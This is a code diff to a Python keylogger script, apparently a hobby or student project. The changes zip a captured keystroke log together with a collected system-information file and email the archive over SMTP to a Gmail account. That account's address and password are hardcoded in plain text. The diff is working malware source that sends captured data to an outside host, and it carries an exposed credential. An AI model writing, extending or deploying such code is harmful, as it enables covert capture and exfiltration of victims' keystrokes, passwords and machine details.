@@ -9,6 +9,9 @@ from email.mime.base import MIMEBase
 from email import encoders
 import smtplib
 
+#for zipping file
+from zipfile import ZipFile
+
 import socket
 import platform
 
@@ -26,23 +29,16 @@ from cryptography.fernet import Fernet
 import getpass
 from requests import get
 
-#     Test to see when keylogger has been started. Mouse to top left.
-#     def controlmouse():
-#     mouse = Controller()
-#     mouse.position = (0, 0)
-
-# logging.basicConfig(filename=(log_dir + "keylogs.txt"), level=logging.DEBUG, format='%(asctime)s: %(message)s')
-
 log_file = r"\keylog.txt"
 system_file = r"\systeminfo.txt"
+file_path = r"Z:\keylogger\email"
 
-file_path = r"Z:\keylogger"
 email_address = "keyloggerproject4@gmail.com"
 password = "Keylogger12345!"
 to_address = "keyloggerproject4@gmail.com"
 
-email_folder = file_path + r"\email"
-
+email_folder = r"Z:\keylogger\email"
+email_folder_zip = r"Z:\keylogger\email.zip"
 
 def send_email(file_path, attachment, to_address):
 
@@ -85,8 +81,13 @@ def send_email(file_path, attachment, to_address):
 
     s.quit()
 
+def zip_folder(file_name, file_name2):
+    zipfile = ZipFile('email.zip', 'w')
+    zipfile.write(file_name)
+    zipfile.write(file_name2)
 
-send_email(log_file, email_folder, to_address)
+print('zip file created successfully')
+
 
 def computer_information():
     with open(file_path + system_file, "a") as f:
@@ -107,6 +108,10 @@ def computer_information():
 
 
 computer_information()
+
+zip_folder(email_folder + log_file,email_folder + system_file)
+
+send_email(log_file, email_folder_zip, to_address)
 
 #pypnut logger methods
 count = 0
